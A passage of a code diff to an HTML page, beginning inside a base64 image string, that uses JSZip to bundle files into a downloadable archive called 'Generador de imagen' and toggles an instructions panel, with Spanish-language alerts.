AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVzAKsAqYBFQFUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPMBJa8Qs5OUlUMAAAAASUVORK5CYII="
+            };
+
+            const zip = new JSZip();
+            Object.keys(files).forEach(name => zip.file(name, files[name]));
+            zip.generateAsync({ type: "blob" }).then(blob => {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'Generador de imagen';
+                a.click();
+                URL.revokeObjectURL(url);
+                alert('Generador Creado correctamente.');
+            }).catch(err => {
+                alert(' Error al generar: ' + err.message);
+            });
+        };
+
+        window.mostrarInstrucciones = function() {
+            const panel = document.getElementById('instruccionesPanel');
+            if (panel) {
+                panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+            }
+        };
+    </script>
+</body>
+</html>
